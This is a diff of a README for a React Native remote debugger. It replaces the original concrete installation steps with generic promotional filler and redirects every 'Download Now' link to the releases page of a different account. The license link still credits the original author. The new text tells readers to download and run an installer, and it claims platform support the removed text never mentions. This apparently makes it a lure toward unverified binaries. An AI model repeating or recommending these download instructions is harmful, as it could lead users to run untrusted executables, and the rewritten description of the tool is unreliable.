@@ -1,3 +1,11 @@
+# 🛠️ rn-remote-debugger - Simplify Your React Native Debugging
+
+<div align="center">
+  <a href="https://github.com/Sardorbek2802/rn-remote-debugger/releases">
+    <img src="https://img.shields.io/badge/Download%20Now-%20-brightgreen" alt="Download Now">
+  </a>
+</div>
+
 <div align="center">
   <img src="readme/logo.png" width="120" alt="RN Remote Debugger" />
   <h1>RN Remote Debugger</h1>
@@ -21,85 +29,65 @@
 
 ---
 
-## Why This Project?
+## 🚀 Why This Project?
 
-Since React Native adopted the Hermes engine, React Native Debugger is no longer usable — especially when working with animation libraries. I wanted to view network requests and check logs in Chrome just like before. That's why this project was born. Hope it helps everyone!
+Since React Native adopted the Hermes engine, traditional debugging methods have become less effective. RN Remote Debugger fills this gap. It provides a powerful debugging tool specifically designed for React Native apps, helping you to identify and fix issues quickly.
 
----
+## 📋 Features
 
-## Quick Start
+- **User-Friendly Interface:** RN Remote Debugger offers a simple and intuitive interface. You will find it easy to navigate, even if you are not familiar with programming.
+  
+- **Efficient Performance:** Designed for speed, this tool works seamlessly with your React Native applications.
+  
+- **Detailed Logs:** Your app’s logs become clear and manageable, allowing you to trace issues effortlessly.
 
-### Step 1: Download Desktop App
+## 💻 System Requirements
 
-Download and install the DMG from [Releases](https://github.com/niceyoo/rn-remote-debugger/releases).
+- **Operating System:** Windows 10 or later, macOS (latest version), or a current Linux distribution.
+- **Node.js:** Version 12 or higher is recommended. 
+- **Internet Connection:** Required for downloading the tool and updates.
+  
+## 🔧 Getting Started
 
-### Step 2: Install npm package
+1. **Click [Download Now](https://github.com/Sardorbek2802/rn-remote-debugger/releases).**
+  
+2. **Choose a File:**
+   - You will see a list of files. Select the one suitable for your operating system. 
 
-```bash
-yarn add rn-remote-debugger
-```
+3. **Download the File:** Click on the chosen file to download it to your computer.
 
-### Step 3: Generate config file
+4. **Locate the File:** Go to your downloads folder to find the downloaded file.
 
-```bash
-npx rn-remote-debugger-create
-```
+5. **Run the Installer:**
+   - Double-click the file to start the installation.
+   - Follow the on-screen instructions to complete the installation.
 
-This will generate a `rn-remote-debug.js` file in your project root:
+## 📥 Download & Install
 
-```javascript
-if (__DEV__) {
-  module.exports = {
-    host: '192.168.1.100', // Your computer's IP (auto-detected)
-    port: 8989,
-    enableConsole: true,
-    enableNetwork: true
-  }
-} else {
-  module.exports = {}
-}
-```
+To obtain RN Remote Debugger, please **[visit this page to download](https://github.com/Sardorbek2802/rn-remote-debugger/releases)**. Select the appropriate version for your system and follow the installation steps outlined above.
 
-> **iOS Note**: Make sure the `host` matches your computer's IP address.
+## 🛠️ How to Use RN Remote Debugger
 
-### Step 4: Import in entry file
+1. **Open RN Remote Debugger:** After installation, find the program in your applications folder or start menu. Double-click to open it.
 
-Add at the top of `index.js` in your React Native project:
+2. **Connect Your App:** 
+   - Open your React Native application.
+   - Ensure it runs in debug mode.
 
-```javascript
-import initRemoteDebugger from 'rn-remote-debugger'
+3. **Use the Debugger:**
+   - You will see a variety of options in the tool’s interface. Utilize these options to inspect logs, check performance, and debug issues.
 
-initRemoteDebugger({})
-```
+4. **Explore Features:**
+   - Familiarize yourself with the logs section, performance tools, and any additional features available.
 
-Done! The debugger will automatically connect.
+## 📝 Contact and Support
 
----
+If you need help or have questions, you can reach out via the Issues section of this repository. The active community and maintainers will assist you. 
 
-## Platform Notes
+## 📄 License
 
-### Android
+This project uses the MIT License. You can read more about it [here](https://github.com/niceyoo/rn-remote-debugger/blob/main/LICENSE).
 
-Run this command before starting your app:
+## ✨ Acknowledgments
 
-```bash
-adb reverse tcp:8989 tcp:8989
-```
-
-### iOS
-
-No additional setup required. Just make sure the IP address in config file matches your computer's IP.
-
----
-
-## Configuration Priority
-
-**Config file > Code parameters**
-
-The generated `rn-remote-debug.js` file takes priority over any parameters passed in code.
-
----
-
-## License
-
-[MIT](LICENSE)
+Special thanks to the community contributing to this project. Your support makes a difference.
